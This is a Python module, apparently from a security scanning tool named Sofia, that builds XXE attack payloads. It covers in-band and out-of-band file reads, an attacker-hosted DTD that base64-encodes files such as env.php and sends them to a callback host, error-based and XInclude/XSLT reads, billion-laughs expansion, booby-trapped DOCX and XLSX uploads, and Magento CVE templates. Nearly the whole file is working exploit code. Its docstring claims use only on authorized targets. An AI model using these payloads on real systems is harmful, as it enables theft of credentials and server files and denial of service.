"""XXE payload library.

Each payload kind has a builder that produces a full XML (or multipart/SVG/RSS/
DOCX/SOAP) document given:

  ctx: dict with keys
    - cid      : canary id (uuid hex[:10])
    - oob_base : attacker callback base, e.g. https://x.trycloudflare.com
    - target   : file path to exfiltrate (env.php etc.)
    - dtd_url  : full URL to attacker DTD
    - levels   : entity expansion levels (billion laughs)
    - width    : entity expansion width
    - body     : optional benign XML body to wrap

Sofia only ever generates payloads against user-authorized targets.
"""

from __future__ import annotations

import base64
import io
import zipfile
from typing import Callable, Dict, List, Optional

import xml.etree.ElementTree as ET  # only used to *build* benign OOXML parts

_XML_DECL = '<?xml version="1.0" encoding="UTF-8"?>'


# --------------------------------------------------------------------------
# helpers
# --------------------------------------------------------------------------

def _esc(text: str) -> str:
    return (text.replace("&", "&amp;").replace("<", "&lt;")
                .replace(">", "&gt;").replace('"', "&quot;"))


def _strip_target_scheme(target: str) -> str:
    """Reduce a possibly-wrapped target to a bare path.

    Strips php filter wrappers and scheme prefixes (iteratively) so callers can
    re-apply the correct wrapper without producing ``file://file://...`` or
    ``php://filter/.../resource=php://...`` chains.  A bare relative path such as
    ``app/etc/env.php`` is returned unchanged.
    """
    t = (target or "").strip()
    prefixes = (
        "php://filter/read=convert.base64-encode/resource=",
        "resource=",
        "resource:",
        "file://",
        "php://",
    )
    changed = True
    while changed and t:
        changed = False
        for p in prefixes:
            if t.startswith(p):
                t = t[len(p):]
                changed = True
                break
    return t


def _param_entity_http_exfil(cid: str, oob_base: str, target: str) -> str:
    """DTD content served by the attacker: OOB file exfil via php filter base64."""
    host = _esc(oob_base.rstrip("/"))
    path = _esc(_strip_target_scheme(target)).replace("'", "&apos;")
    return (
        f'<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource={path}">\n'
        f'<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'{host}/x/{cid}?d=%file;\'>">\n'
        f'%eval;\n%exfil;\n'
    )


def _dtd_generic(cid: str, oob_base: str, target: str) -> str:
    """Fallback DTD (non-php targets) - path fallback to /etc/passwd handled by caller."""
    host = _esc(oob_base.rstrip("/"))
    path = _esc(_strip_target_scheme(target))
    return (
        f'<!ENTITY % file SYSTEM "file://{path}">\n'
        f'<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'{host}/x/{cid}?d=%file;\'>">\n'
        f'%eval;\n%exfil;\n'
    )


# --------------------------------------------------------------------------
# builders
# --------------------------------------------------------------------------

def build_internal_entity(ctx: Dict) -> str:
    """Direct internal entity echo (classic XXE, response reflected)."""
    cid = ctx.get("cid", "x")
    val = f"SOFIA[{cid}]"
    return (
        f"{_XML_DECL}\n<!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]>"
        f"<r>&xxe;{val}</r>"
    )


def build_oob_probe_http(ctx: Dict) -> str:
    """External entity referencing an HTTP URL -> OOB probe hit."""
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = f"{oob.rstrip('/')}/probe/{cid}"
    return (
        f"{_XML_DECL}\n<!DOCTYPE r [<!ENTITY xxe SYSTEM \"{url}\">]>"
        f"<r>&xxe;</r>"
    )


def build_oob_parameter_entity(ctx: Dict) -> str:
    """Parameter entity loading attacker DTD from OOB server."""
    cid = ctx.get("cid", "x")
    dtd = ctx.get("dtd_url", "")
    if not dtd:
        dtd = f"{ctx.get('oob_base', 'http://127.0.0.1:17888')}/dtd/{cid}.dtd"
    return (
        f"{_XML_DECL}\n<!DOCTYPE r [<!ENTITY % ext SYSTEM \"{dtd}\"> %ext;]>"
        f"<r>SOFIA[{cid}]</r>"
    )


def build_oob_file_exfil(ctx: Dict) -> str:
    """Parameter-entity chain that fetches attacker DTD which exfiltrates a file."""
    cid = ctx.get("cid", "x")
    dtd = ctx.get("dtd_url", "")
    if not dtd:
        dtd = f"{ctx.get('oob_base', 'http://127.0.0.1:17888')}/dtd/{cid}.dtd"
    return (
        f"{_XML_DECL}\n<!DOCTYPE r [<!ENTITY % ext SYSTEM \"{dtd}\"> %ext;]>"
        f"<r>SOFIA[{cid}]</r>"
    )


def build_error_based(ctx: Dict) -> str:
    """Error-based XXE: force parser error that includes file content."""
    cid = ctx.get("cid", "x")
    path = _esc(_strip_target_scheme(ctx.get("target", "file:///etc/hostname")))
    return (
        f"{_XML_DECL}\n<!DOCTYPE r [<!ENTITY % file SYSTEM \"file://{path}\">"
        f"<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">"
        f"%eval;]>\n<r>SOFIA[{cid}]</r>"
    )


def build_xinclude(ctx: Dict) -> str:
    """XInclude (only works when XInclude processing enabled)."""
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = f"{oob.rstrip('/')}/probe/{cid}"
    return (
        f"{_XML_DECL}\n<r xmlns:xi=\"http://www.w3.org/2001/XInclude\">"
        f"<xi:include parse=\"text\" href=\"{url}\"/></r>"
    )


def build_xslt(ctx: Dict) -> str:
    """XSLT payload - document() to read local files, rendered via output."""
    cid = ctx.get("cid", "x")
    path = _esc(_strip_target_scheme(ctx.get("target", "file:///etc/hostname")))
    return (
        f"{_XML_DECL}\n<?xml-stylesheet type=\"text/xsl\" href=\"#s\"?>"
        f"<r>SOFIA[{cid}]</r>\n<xsl:stylesheet id=\"s\" version=\"1.0\" "
        f"xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">"
        f"<xsl:template match=\"/\"><xsl:copy-of select=\"document('file://{path}')\"/>"
        f"</xsl:template></xsl:stylesheet>"
    )


def build_entity_expansion(ctx: Dict) -> str:
    """Billion laughs - bounded by risk tier (levels/width from ctx)."""
    cid = ctx.get("cid", "x")
    levels = int(ctx.get("levels", 6))
    width = int(ctx.get("width", 16))
    parts = [f"{_XML_DECL}\n<!DOCTYPE lolz ["]
    parts.append('<!ENTITY lol "lol">')
    prev = "lol"
    for i in range(1, levels):
        name = f"lol{i}"
        parts.append(f'<!ENTITY {name} "{prev * width}">')
        prev = name
    parts.append(f"]>\n<r>&{prev};</r>")
    return "\n".join(parts)


def build_svg_entity(ctx: Dict) -> str:
    """SVG with external entity (browser/parser dependent)."""
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = f"{oob.rstrip('/')}/probe/{cid}"
    return (
        f"{_XML_DECL}\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"{url}\">]>"
        f"<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\">"
        f"<text x=\"10\" y=\"20\">&xxe;SOFIA[{cid}]</text></svg>"
    )


def build_soap_entity(ctx: Dict) -> str:
    """SOAP envelope containing XXE payload."""
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = f"{oob.rstrip('/')}/probe/{cid}"
    return (
        f"{_XML_DECL}\n<!DOCTYPE Envelope [<!ENTITY xxe SYSTEM \"{url}\">]>"
        f"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">"
        f"<soapenv:Body><req>&xxe;SOFIA[{cid}]</req></soapenv:Body></soapenv:Envelope>"
    )


def build_json_xml_chain(ctx: Dict) -> str:
    """JSON payload whose string field carries XML (for JSON->XML converters)."""
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = f"{oob.rstrip('/')}/probe/{cid}"
    xml = (
        f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "{url}">]><r>&xxe;SOFIA[{cid}]</r>'
    )
    return f'{{"data": "{xml}", "cid": "{cid}"}}'


def build_rss_entity(ctx: Dict) -> str:
    """RSS feed document with external entity."""
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = f"{oob.rstrip('/')}/probe/{cid}"
    return (
        f"{_XML_DECL}\n<!DOCTYPE rss [<!ENTITY xxe SYSTEM \"{url}\">]>"
        f"<rss version=\"2.0\"><channel><title>&xxe;SOFIA[{cid}]</title>"
        f"<item><link>http://x</link></item></channel></rss>"
    )


def build_cosmicsting_svg(ctx: Dict) -> str:
    """Magento CosmicSting (CVE-2024-34102) SVG part for multipart uploads.

    Delivered as an ``image/svg+xml`` file part (e.g. to /graphql, /rest/V1 or
    /import endpoints); a hit on the OOB probe URL proves the uploaded SVG was
    parsed with external entities enabled.
    """
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = f"{oob.rstrip('/')}/probe/{cid}"
    return (
        f"{_XML_DECL}\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"{url}\">]>"
        f"<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\">"
        f"<text x=\"10\" y=\"20\">&xxe;SOFIA[{cid}]</text></svg>"
    )


def build_xml_layout_xxe(ctx: Dict) -> str:
    """Magento XML layout XXE (CVE-2019-8126) template.

    Magento parses layout XML (admin "XML Layout" customizations / import); a
    probe hit proves the parser followed the external entity.
    """
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = f"{oob.rstrip('/')}/probe/{cid}"
    return (
        f"{_XML_DECL}\n<!DOCTYPE layout [<!ENTITY xxe SYSTEM \"{url}\">]>"
        f"<layout>&xxe;SOFIA[{cid}]</layout>"
    )


def _file_uri(target: str) -> str:
    """Normalize a target into a ``file://`` URI for in-band entity reads."""
    t = _strip_target_scheme(target or "").strip()
    if not t:
        return "file:///etc/passwd"
    return f"file://{t}"


def build_file_read_inband(ctx: Dict) -> str:
    """External general entity -> local file, content rendered in the response."""
    cid = ctx.get("cid", "x")
    path = _esc(_file_uri(ctx.get("target", "file:///etc/passwd")))
    return (
        f"{_XML_DECL}\n<!DOCTYPE r [<!ENTITY xxe SYSTEM \"{path}\">]>"
        f"<r>&xxe;SOFIA[{cid}]</r>"
    )


def build_param_entity_file_read(ctx: Dict) -> str:
    """Parameter entity reads a file and feeds it into a general entity.

    Bypasses parsers that block general external entities but still resolve
    parameter entities; the file content is rendered inside <r>.
    """
    cid = ctx.get("cid", "x")
    path = _esc(_file_uri(ctx.get("target", "file:///etc/passwd")))
    return (
        f"{_XML_DECL}\n<!DOCTYPE r ["
        f"<!ENTITY % file SYSTEM \"{path}\">"
        f"<!ENTITY % eval \"<!ENTITY &#x25; exfil '&#x25;file;'>\">"
        f"%eval;]>\n<r>&exfil;SOFIA[{cid}]</r>"
    )


def build_oob_general_entity_dtd(ctx: Dict) -> str:
    """General external entity pointing at the attacker DTD.

    Unlike the parameter-entity variant this works even when parameter
    entities are blocked; the DTD content is inlined in the response and the
    fetch itself registers an OOB callback.
    """
    cid = ctx.get("cid", "x")
    dtd = ctx.get("dtd_url", "")
    if not dtd:
        dtd = f"{ctx.get('oob_base', 'http://127.0.0.1:17888')}/dtd/{cid}.dtd"
    return (
        f"{_XML_DECL}\n<!DOCTYPE r [<!ENTITY xxe SYSTEM \"{dtd}\">]>"
        f"<r>&xxe;SOFIA[{cid}]</r>"
    )


def build_oob_probe_https(ctx: Dict) -> str:
    """External entity via the HTTPS scheme.

    Matches egress filters / parsers that only follow https URLs.  Only
    produces a callback when the OOB base is reachable over TLS (e.g. the
    Cloudflare tunnel URL, which is https:// on the wire).
    """
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = f"{oob.rstrip('/')}/probe/{cid}"
    if url.startswith("http://"):
        url = "https://" + url[len("http://"):]
    return (
        f"{_XML_DECL}\n<!DOCTYPE r [<!ENTITY xxe SYSTEM \"{url}\">]>"
        f"<r>&xxe;</r>"
    )


def build_xinclude_file(ctx: Dict) -> str:
    """XInclude pulling a local file as text."""
    cid = ctx.get("cid", "x")
    path = _esc(_file_uri(ctx.get("target", "file:///etc/passwd")))
    return (
        f"{_XML_DECL}\n<r xmlns:xi=\"http://www.w3.org/2001/XInclude\">"
        f"<xi:include parse=\"text\" href=\"{path}\"/>SOFIA[{cid}]</r>"
    )


def build_xslt_oob(ctx: Dict) -> str:
    """XSLT stylesheet whose document() fetches the OOB probe URL."""
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = _esc(f"{oob.rstrip('/')}/probe/{cid}")
    return (
        f"{_XML_DECL}\n<?xml-stylesheet type=\"text/xsl\" href=\"#s\"?>"
        f"<r>SOFIA[{cid}]</r>\n<xsl:stylesheet id=\"s\" version=\"1.0\" "
        f"xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">"
        f"<xsl:template match=\"/\"><xsl:copy-of select=\"document('{url}')\"/>"
        f"</xsl:template></xsl:stylesheet>"
    )


def build_svg_file_read(ctx: Dict) -> str:
    """SVG with an external entity reading a local file (in-band)."""
    cid = ctx.get("cid", "x")
    path = _esc(_file_uri(ctx.get("target", "file:///etc/passwd")))
    return (
        f"{_XML_DECL}\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"{path}\">]>"
        f"<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\">"
        f"<text x=\"10\" y=\"20\">&xxe;SOFIA[{cid}]</text></svg>"
    )


def build_soap_file_read(ctx: Dict) -> str:
    """SOAP envelope whose entity reads a local file (in-band)."""
    cid = ctx.get("cid", "x")
    path = _esc(_file_uri(ctx.get("target", "file:///etc/passwd")))
    return (
        f"{_XML_DECL}\n<!DOCTYPE Envelope [<!ENTITY xxe SYSTEM \"{path}\">]>"
        f"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">"
        f"<soapenv:Body><req>&xxe;SOFIA[{cid}]</req></soapenv:Body></soapenv:Envelope>"
    )


def build_json_xml_chain_file(ctx: Dict) -> str:
    """JSON payload carrying in-band file-read XML (JSON->XML converters)."""
    cid = ctx.get("cid", "x")
    path = _esc(_file_uri(ctx.get("target", "file:///etc/passwd")))
    xml = (
        f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "{path}">]><r>&xxe;SOFIA[{cid}]</r>'
    )
    return f'{{"data": "{xml}", "cid": "{cid}"}}'


def _zip_ooxml(parts: Dict[str, str]) -> bytes:
    """Zip named XML parts into an OOXML package."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, content in parts.items():
            z.writestr(name, content)
    return buf.getvalue()


def _docx_parts(document_xml: str) -> Dict[str, str]:
    content_types = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Override PartName="/word/document.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
        '</Types>'
    )
    rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
        'Target="word/document.xml"/></Relationships>'
    )
    return {
        "[Content_Types].xml": content_types,
        "_rels/.rels": rels,
        "word/document.xml": document_xml,
    }


def build_docx_upload(ctx: Dict) -> bytes:
    """Minimal OOXML (.docx) zip containing a XXE-carrying document.xml."""
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = f"{oob.rstrip('/')}/probe/{cid}"
    document_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<!DOCTYPE w:document [<!ENTITY xxe SYSTEM "'
        + url + '">]>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        '<w:body><w:p><w:r><w:t>&xxe;SOFIA[' + cid + ']</w:t></w:r></w:p></w:body></w:document>'
    )
    return _zip_ooxml(_docx_parts(document_xml))


def build_docx_file_read(ctx: Dict) -> bytes:
    """OOXML .docx whose document.xml reads a local file (in-band)."""
    cid = ctx.get("cid", "x")
    path = _esc(_file_uri(ctx.get("target", "file:///etc/passwd")))
    document_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<!DOCTYPE w:document [<!ENTITY xxe SYSTEM "'
        + path + '">]>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        '<w:body><w:p><w:r><w:t>&xxe;SOFIA[' + cid + ']</w:t></w:r></w:p></w:body></w:document>'
    )
    return _zip_ooxml(_docx_parts(document_xml))


def build_xlsx_upload(ctx: Dict) -> bytes:
    """Minimal OOXML (.xlsx) zip carrying an XXE probe in sheet1.xml.

    Spreadsheet import/convert endpoints often reuse a different parser path
    than plain XML uploads, so the .xlsx package is worth probing separately.
    """
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = f"{oob.rstrip('/')}/probe/{cid}"
    sheet = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<!DOCTYPE worksheet [<!ENTITY xxe SYSTEM "'
        + url + '">]>'
        '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
        '<sheetData><row r="1"><c r="A1"><v>&xxe;SOFIA[' + cid + ']</v></c></row>'
        '</sheetData></worksheet>'
    )
    content_types = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Override PartName="/xl/workbook.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
        '<Override PartName="/xl/worksheets/sheet1.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>'
        '</Types>'
    )
    root_rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
        'Target="xl/workbook.xml"/></Relationships>'
    )
    workbook = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
        'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
        '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>'
    )
    workbook_rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" '
        'Target="worksheets/sheet1.xml"/></Relationships>'
    )
    return _zip_ooxml({
        "[Content_Types].xml": content_types,
        "_rels/.rels": root_rels,
        "xl/workbook.xml": workbook,
        "xl/_rels/workbook.xml.rels": workbook_rels,
        "xl/worksheets/sheet1.xml": sheet,
    })


def build_baseline_xml(ctx: Dict) -> str:
    """Benign XML used for baseline and negative control."""
    cid = ctx.get("cid", "x")
    return f"{_XML_DECL}\n<r>SOFIA[{cid}] benign</r>"


def build_negative_control(ctx: Dict) -> str:
    """Negative control: XML without any entity/DOCTYPE (should not trigger OOB)."""
    cid = ctx.get("cid", "x")
    return f"{_XML_DECL}\n<r>SOFIA[{cid}] control</r>"


# --------------------------------------------------------------------------
# registry
# --------------------------------------------------------------------------

def _ctx_with_defaults(ctx: Dict) -> Dict:
    d = dict(ctx or {})
    d.setdefault("cid", "x")
    d.setdefault("oob_base", "http://127.0.0.1:17888")
    d.setdefault("target", "file:///etc/hostname")
    return d


PAYLOAD_REGISTRY: Dict[str, Dict] = {
    "baseline": {
        "label": "Baseline benign XML",
        "content_type": "application/xml",
        "builder": build_baseline_xml,
        "binary": False,
        "purpose": "baseline",
    },
    "negative_control": {
        "label": "Negative control (no DOCTYPE)",
        "content_type": "application/xml",
        "builder": build_negative_control,
        "binary": False,
        "purpose": "negative_control",
    },
    "internal_entity": {
        "label": "Internal/external entity echo",
        "content_type": "application/xml",
        "builder": build_internal_entity,
        "binary": False,
        "purpose": "capability",
        "capability": "entity",
    },
    "oob_probe_http": {
        "label": "OOB HTTP external entity probe",
        "content_type": "application/xml",
        "builder": build_oob_probe_http,
        "binary": False,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
    },
    "oob_parameter_entity": {
        "label": "OOB parameter entity (DTD fetch)",
        "content_type": "application/xml",
        "builder": build_oob_parameter_entity,
        "binary": False,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
    },
    "oob_file_exfil": {
        "label": "OOB file exfiltration (env.php targets)",
        "content_type": "application/xml",
        "builder": build_oob_file_exfil,
        "binary": False,
        "purpose": "exfil",
        "capability": "external_entity",
        "requires_oob": True,
        "requires_exfil": True,
    },
    "error_based": {
        "label": "Error-based file read",
        "content_type": "application/xml",
        "builder": build_error_based,
        "binary": False,
        "purpose": "capability",
        "capability": "error_reflection",
    },
    "xinclude": {
        "label": "XInclude",
        "content_type": "application/xml",
        "builder": build_xinclude,
        "binary": False,
        "purpose": "capability",
        "capability": "xinclude",
        "requires_oob": True,
    },
    "xslt": {
        "label": "XSLT document()",
        "content_type": "application/xml",
        "builder": build_xslt,
        "binary": False,
        "purpose": "capability",
        "capability": "xslt",
    },
    "entity_expansion": {
        "label": "Entity expansion (bounded)",
        "content_type": "application/xml",
        "builder": build_entity_expansion,
        "binary": False,
        "purpose": "capability",
        "capability": "resource_limit",
    },
    "svg_entity": {
        "label": "SVG external entity",
        "content_type": "image/svg+xml",
        "builder": build_svg_entity,
        "binary": False,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
    },
    "soap_entity": {
        "label": "SOAP envelope XXE",
        "content_type": "text/xml",
        "builder": build_soap_entity,
        "binary": False,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
    },
    "json_xml_chain": {
        "label": "JSON->XML chain",
        "content_type": "application/json",
        "builder": build_json_xml_chain,
        "binary": False,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
    },
    "rss_entity": {
        "label": "RSS feed external entity",
        "content_type": "application/rss+xml",
        "builder": build_rss_entity,
        "binary": False,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
    },
    "docx_upload": {
        "label": "OOXML .docx with XXE",
        "content_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "builder": build_docx_upload,
        "binary": True,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
    },
    "cosmicsting_svg": {
        "label": "Magento CosmicSting SVG (CVE-2024-34102)",
        "content_type": "image/svg+xml",
        "builder": build_cosmicsting_svg,
        "binary": False,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
        "cve_id": "CVE-2024-34102",
    },
    "xml_layout_xxe": {
        "label": "Magento XML layout XXE (CVE-2019-8126)",
        "content_type": "application/xml",
        "builder": build_xml_layout_xxe,
        "binary": False,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
        "cve_id": "CVE-2019-8126",
    },
    "file_read_inband": {
        "label": "In-band file read (general entity)",
        "content_type": "application/xml",
        "builder": build_file_read_inband,
        "binary": False,
        "purpose": "exfil",
        "capability": "external_entity",
        "file_read": True,
        "requires_exfil": True,
    },
    "param_entity_file_read": {
        "label": "Parameter-entity in-band file read",
        "content_type": "application/xml",
        "builder": build_param_entity_file_read,
        "binary": False,
        "purpose": "exfil",
        "capability": "external_entity",
        "file_read": True,
        "requires_exfil": True,
    },
    "oob_general_entity_dtd": {
        "label": "OOB general entity -> attacker DTD",
        "content_type": "application/xml",
        "builder": build_oob_general_entity_dtd,
        "binary": False,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
    },
    "oob_probe_https": {
        "label": "OOB HTTPS external entity probe",
        "content_type": "application/xml",
        "builder": build_oob_probe_https,
        "binary": False,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
    },
    "xinclude_file": {
        "label": "XInclude file read",
        "content_type": "application/xml",
        "builder": build_xinclude_file,
        "binary": False,
        "purpose": "exfil",
        "capability": "xinclude",
        "file_read": True,
        "requires_exfil": True,
    },
    "xslt_oob": {
        "label": "XSLT document() OOB probe",
        "content_type": "application/xml",
        "builder": build_xslt_oob,
        "binary": False,
        "purpose": "capability",
        "capability": "xslt",
        "requires_oob": True,
    },
    "svg_file_read": {
        "label": "SVG in-band file read",
        "content_type": "image/svg+xml",
        "builder": build_svg_file_read,
        "binary": False,
        "purpose": "exfil",
        "capability": "external_entity",
        "file_read": True,
        "requires_exfil": True,
    },
    "soap_file_read": {
        "label": "SOAP in-band file read",
        "content_type": "text/xml",
        "builder": build_soap_file_read,
        "binary": False,
        "purpose": "exfil",
        "capability": "external_entity",
        "file_read": True,
        "requires_exfil": True,
    },
    "json_xml_chain_file": {
        "label": "JSON->XML in-band file read",
        "content_type": "application/json",
        "builder": build_json_xml_chain_file,
        "binary": False,
        "purpose": "exfil",
        "capability": "external_entity",
        "file_read": True,
        "requires_exfil": True,
    },
    "docx_file_read": {
        "label": "OOXML .docx in-band file read",
        "content_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "builder": build_docx_file_read,
        "binary": True,
        "purpose": "exfil",
        "capability": "external_entity",
        "file_read": True,
        "requires_exfil": True,
    },
    "xlsx_upload": {
        "label": "OOXML .xlsx with XXE",
        "content_type": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        "builder": build_xlsx_upload,
        "binary": True,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
    },
}


def get_payload(kind: str, ctx: Optional[Dict] = None,
                cid: Optional[str] = None,
                oob_base: Optional[str] = None,
                target: Optional[str] = None,
                levels: Optional[int] = None,
                width: Optional[int] = None):
    """Return (kind, content_type, data) for a payload kind."""
    spec = PAYLOAD_REGISTRY.get(kind)
    if not spec:
        raise KeyError(f"unknown payload kind: {kind}")
    full = _ctx_with_defaults(ctx or {})
    if cid:
        full["cid"] = cid
    if oob_base:
        full["oob_base"] = oob_base
    if target:
        full["target"] = target
    if levels is not None:
        full["levels"] = levels
    if width is not None:
        full["width"] = width
    data = spec["builder"](full)
    return kind, spec["content_type"], data


def dtd_payload(cid: str, oob_base: str, target: str, php: bool = True) -> str:
    """Content for the attacker-hosted .dtd endpoint."""
    if php or target.startswith("php://"):
        return _param_entity_http_exfil(cid, oob_base, target)
    return _dtd_generic(cid, oob_base, target)


def payload_kinds() -> List[str]:
    return list(PAYLOAD_REGISTRY.keys())







